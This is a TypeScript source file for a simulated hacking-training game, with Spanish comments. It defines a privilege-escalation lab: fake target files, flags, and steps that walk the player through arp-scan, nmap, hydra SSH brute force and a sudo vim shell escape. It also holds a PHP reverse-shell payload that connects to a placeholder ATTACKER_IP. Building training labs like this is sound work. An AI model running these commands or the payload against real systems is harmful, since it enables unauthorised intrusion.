// ── laboratorios/laboratorio05.ts ───────────────────────────────────────
// Scenario 5 — Privilege Escalation Lab
// Datos y configuración específicos para este escenario

import { assignDHCP } from '../utils/network';
import type { Machine, Scenario, MachineInfo, Port, LearningStep, Mission, FileEntry } from '../types';

// MACs únicas para máquinas atacantes (evita colisiones entre escenarios)
const ATTACKER_MACS = ['08:00:27:AA:BB:CC', '08:00:27:AA:BB:CD', '08:00:27:AA:BB:CE'];
let attackerCount = 0;

// Resetea el contador de MACs al cambiar de escenario
export function resetAttackerCounter() { attackerCount = 0; }

export function createAttackerMachine(networkRange: string, customHostname?: string): Machine {
  const mac = ATTACKER_MACS[attackerCount % ATTACKER_MACS.length];
  attackerCount++;
  return {
    id: 'attacker-01',
    machine_info: { hostname: customHostname || 'kali-attacker', ip: '', mac, os: 'Kali Linux 2023.4', status: 'up', type: 'workstation' },
    discovery_level: 4, scan_results: { ports: [] }, web_enumeration: { web_server: 'none', cms: 'none', directories: [] },
    learning_steps: [], files: [],
  };
}

interface ScenarioBuilderConfig {
  id: string; name: string; description: string;
  difficulty: 'Easy' | 'Medium' | 'Hard';
  category: 'Web' | 'Network' | 'Crypto' | 'Forensics';
  networkRange: string; attackerFiles?: FileEntry[];
  targetMachine: Omit<Machine, 'machine_info' | 'id'> & { id: string; machine_info: Omit<MachineInfo, 'ip'>; ports: Port[] };
  learningSteps: LearningStep[];
}

export function buildScenario(config: ScenarioBuilderConfig): Scenario {
  const attacker = createAttackerMachine(config.networkRange);
  if (config.attackerFiles?.length) attacker.files = config.attackerFiles;
  const target: Machine = {
    ...config.targetMachine,
    machine_info: { ...config.targetMachine.machine_info, ip: '' } as MachineInfo,
    scan_results: { ports: config.targetMachine.ports },
    web_enumeration: config.targetMachine.web_enumeration || { web_server: 'none', cms: 'none', directories: [] },
    discovery_level: 0,
    learning_steps: config.learningSteps.map((step, idx) => ({ ...step, id: idx + 1 })),
    files: config.targetMachine.files || [],
  };
  const machines = assignDHCP(config.networkRange, [attacker, target]);
  const missions: Mission[] = config.learningSteps.map((step, idx) => ({
    id: idx + 1, title: step.task, description: step.text,
    status: idx === 0 ? 'active' : 'pending', targetMachineId: config.targetMachine.id, discoveryLevel: step.discoveryLevel,
  }));
  return {
    id: config.id, name: config.name, description: config.description,
    difficulty: config.difficulty, category: config.category, network_range: config.networkRange,
    initialMachineId: 'attacker-01', machines, missions,
  };
}

export const COMMON_PORTS = {
  ssh: (version = 'OpenSSH 8.2p1 Ubuntu', creds?: { user: string; pass: string }): Port => ({ port: 22, protocol: 'tcp', state: 'open', service: 'ssh', version, credentials: creds }),
  http: (version = 'Apache httpd 2.4.41'): Port => ({ port: 80, protocol: 'tcp', state: 'open', service: 'http', version }),
  https: (version = 'nginx'): Port => ({ port: 443, protocol: 'tcp', state: 'open', service: 'https', version }),
  mysql: (state: 'open' | 'filtered' | 'closed' = 'filtered'): Port => ({ port: 3306, protocol: 'tcp', state, service: 'mysql', version: state === 'open' ? 'MySQL 5.7.38' : 'unknown' }),
  smb: (version = 'Windows 7 Professional 7601'): Port => ({ port: 445, protocol: 'tcp', state: 'open', service: 'microsoft-ds', version }),
  rdp: (): Port => ({ port: 3389, protocol: 'tcp', state: 'open', service: 'ms-wbt-server', version: 'Microsoft Terminal Services' }),
};

export function createWebDirs(paths: Array<{ path: string; status: 200 | 301 | 403 | 404; description: string }>) {
  return paths.map(p => ({ path: p.path, status: p.status, description: p.description }));
}

export function createFile(path: string, content: string, type: 'text' | 'hash' | 'binary' = 'text') {
  return { path, content, type };
}

const REVERSE_SHELL_PAYLOAD = {
  phpSimple: `<?php\n\$ip = "ATTACKER_IP"; \$port = LISTENER_PORT;\n\$sock = fsockopen(\$ip, \$port);\nif(\$sock === false) { echo "No connection"; exit(); }\n\$proc = proc_open('/bin/bash', array(0=>\$sock,1=>\$sock,2=>\$sock), \$pipes);\n?>`,
};

export interface LinuxFileSystemConfig { username?: string; password?: string; shadowPassword?: string; }

export function createLinuxFileSystem(config: LinuxFileSystemConfig = {}) {
  const u = config.username || 'www-data';
  const sp = config.shadowPassword || '$6$rounds=656000$abcdefghijklmnop$1234567890abcdefghijklmnop/1234567890123456';
  return [
    createFile('/etc/passwd', `root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nadmin:x:1000:1000:admin,,,:/home/admin:/bin/bash\n${u}:x:1001:1001:${u},,,:/home/${u}:/bin/bash`, 'text'),
    createFile('/etc/shadow', `root:${sp}:18000:0:99999:7:::\ndaemon:*:18000:0:99999:7:::\nwww-data:*:18000:0:99999:7:::`, 'text'),
    createFile('/etc/hostname', 'target-server', 'text'),
    createFile('/etc/os-release', 'NAME="Ubuntu"\nVERSION="20.04.5 LTS"\nID=ubuntu\nPRETTY_NAME="Ubuntu 20.04.5 LTS"\nVERSION_ID=20.04', 'text'),
    createFile('/var/www/html/index.html', '<!DOCTYPE html>\n<html><head><title>Web Server</title></head>\n<body><h1>Welcome to Apache2 Ubuntu Default Page</h1></body></html>', 'text'),
    createFile('/var/www/html/.htaccess', '# AuthType Basic\n# AuthName "Restricted Area"\n# AuthUserFile /var/www/html/.htpasswd', 'text'),
    createFile('/home/admin/.bashrc', 'export PATH="$HOME/bin:$PATH"\nalias ll="ls -l"\nalias la="ls -la"', 'text'),
    createFile('/home/admin/.bash_history', 'ls -la\npwd\ncat /etc/passwd\nsudo su\nwhoami', 'text'),
    createFile('/root/.bashrc', 'export PATH="/root/bin:$PATH"\nalias ll="ls -l"', 'text'),
    createFile('/var/log/auth.log', 'Mar 19 10:23:45 target-server sshd[1234]: Accepted password for admin from 192.168.1.100 port 54321 ssh2\nMar 19 10:24:12 target-server sudo: admin : TTY=pts/0 ; USER=root ; COMMAND=/bin/bash', 'text'),
    createFile('/etc/apache2/apache2.conf', '# ServerAdmin webmaster@localhost\n# DocumentRoot /var/www/html\n# <Directory /var/www/html>\n#   Options Indexes FollowSymLinks\n#   AllowOverride All\n# </Directory>', 'text'),
  ];
}

// Datos específicos para el escenario Privilege Escalation
const scenario05Data = {
  id: 'scenario-05',
  name: 'Privilege Escalation Lab',
  networkRange: '192.168.30.0/24',
  credentials: {
    user: 'developer',
    pass: 'dev2024',
  },
  flags: {
    user: 'ZIL{SSH_ACCESS_DEVELOPER}',
    root: 'ZIL{SUDO_VIM_PRIVESC_COMPLETE}',
  },
  targetMachine: {
    id: 'lab-scenario-05-privesc',
    hostname: 'privesc-lab',
    mac: '08:00:27:E8:F9:0A',
    os: 'Desconocido',
    type: 'server',
    ports: [
      { port: 22, protocol: 'tcp', state: 'open', service: 'ssh', version: 'OpenSSH 8.2p1 Ubuntu' },
      { port: 80, protocol: 'tcp', state: 'open', service: 'http', version: 'Apache/2.4.41 (Ubuntu)' },
    ],
    webServer: 'Apache/2.4.41',
    cms: 'none',
    directories: [
      { path: '/', status: 200, description: 'Página principal' },
      { path: '/admin', status: 200, description: 'Panel administrativo' },
    ],
    files: [
      { path: '/etc/sudoers', content: `# /etc/sudoers\n# This file MUST be edited with the 'visudo' command as root.\nDefaults        env_reset\nDefaults        mail_badpass\nDefaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"\n\n# User privilege specification\nroot            ALL=(ALL:ALL) ALL\n\n# Allow developer to run vim como root sin password\ndeveloper       ALL=(ALL) NOPASSWD: /usr/bin/vim`, type: 'text' },
      { path: '/root/root.txt', content: 'ZIL{SUDO_VIM_PRIVESC_COMPLETE}', type: 'text' },
      { path: '/home/developer/user.txt', content: 'ZIL{SSH_ACCESS_DEVELOPER}', type: 'text' },
      { path: '/home/developer/notes.txt', content: `# Notas del sysadmin\n# TODO: Revisar permisos de sudo — developer no debería tener acceso a vim como root\n# Fecha: 2024-03-15\n# Por ahora dejarlo así hasta el próximo mantenimiento`, type: 'text' },
      { path: '/home/developer/.bash_history', content: `sudo -l\ncat /etc/sudoers\nwhoami`, type: 'text' },
      { path: '/home/developer/.ssh/id_rsa', content: '-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA2x5z9k8vL...', type: 'text' },
    ],
  },
  learningSteps: [
    { id: 1, task: 'Reconocimiento de red', text: 'Descubrí el host activo en la red: arp-scan <network/cidr>', discoveryLevel: 1 },
    { id: 2, task: 'Escaneo de puertos', text: 'Identificá los servicios corriendo: nmap -sV <target-ip>', discoveryLevel: 2 },
    { id: 3, task: 'Fuerza bruta SSH', text: 'Obtené las credenciales de acceso: hydra -l developer -P rockyou.txt <target-ip> ssh', discoveryLevel: 3 },
    { id: 4, task: 'Acceso SSH', text: 'Conectate con las credenciales encontradas: ssh developer@<target-ip> <password>', discoveryLevel: 3 },
    { id: 5, task: 'Enumeración de sudo', text: 'Una vez dentro, listá los permisos de sudo: sudo -l', discoveryLevel: 3 },
    { id: 6, task: 'Escalada de privilegios', text: 'vim tiene permisos NOPASSWD. Usalo para escalar: sudo vim -c \'!bash\'', discoveryLevel: 4 },
    { id: 7, task: 'Capturar la flag de root', text: 'Ahora sos root. Leé la flag: cat /root/root.txt', discoveryLevel: 4 },
  ],
};

// Template específico para Privilege Escalation
export const SCENARIO_TEMPLATES = {
  privesc: (): ScenarioBuilderConfig => ({
    id: scenario05Data.id,
    name: scenario05Data.name,
    description: 'Acceso inicial como usuario no-privilegiado, escalada de privilegios a root mediante sudo.',
    difficulty: 'Medium',
    category: 'Network',
    networkRange: scenario05Data.networkRange,
    targetMachine: {
      id: scenario05Data.targetMachine.id,
      machine_info: {
        hostname: scenario05Data.targetMachine.hostname,
        mac: scenario05Data.targetMachine.mac,
        os: scenario05Data.targetMachine.os,
        status: 'up',
        type: scenario05Data.targetMachine.type,
      },
      discovery_level: 0,
      scan_results: { ports: [] },
      learning_steps: [],
      ports: [
        { ...scenario05Data.targetMachine.ports[0], credentials: scenario05Data.credentials },
        scenario05Data.targetMachine.ports[1],
      ],
      web_enumeration: {
        web_server: scenario05Data.targetMachine.webServer,
        cms: scenario05Data.targetMachine.cms,
        directories: scenario05Data.targetMachine.directories,
      },
      files: [
        ...createLinuxFileSystem({ username: scenario05Data.credentials.user }),
        createFile(`/home/${scenario05Data.credentials.user}/.bash_history`, `sudo -l\ncat /etc/sudoers\nwhoami`, 'text'),
        createFile(`/home/${scenario05Data.credentials.user}/.ssh/id_rsa`, '-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA2x5z9k8vL...', 'text'),
        createFile('/etc/sudoers', `# /etc/sudoers\n# This file MUST be edited with the 'visudo' command as root.\nDefaults        env_reset\nDefaults        mail_badpass\nDefaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"\n\n# User privilege specification\nroot            ALL=(ALL:ALL) ALL\n\n# Allow ${scenario05Data.credentials.user} to run vim como root sin password\n${scenario05Data.credentials.user}       ALL=(ALL) NOPASSWD: /usr/bin/vim`, 'text'),
        createFile('/root/root.txt', scenario05Data.flags.root),
        createFile(`/home/${scenario05Data.credentials.user}/user.txt`, scenario05Data.flags.user),
        createFile(`/home/${scenario05Data.credentials.user}/notes.txt`, `# Notas del sysadmin\n# TODO: Revisar permisos de sudo — ${scenario05Data.credentials.user} no debería tener acceso a vim como root\n# Fecha: 2024-03-15\n# Por ahora dejarlo así hasta el próximo mantenimiento`, 'text'),
      ],
    },
    learningSteps: scenario05Data.learningSteps.map((step, idx) => ({
      ...step,
      id: idx + 1,
      targetMachineId: scenario05Data.targetMachine.id,
    })),
  }),
};

export const scenario_05: Scenario = buildScenario(SCENARIO_TEMPLATES.privesc());
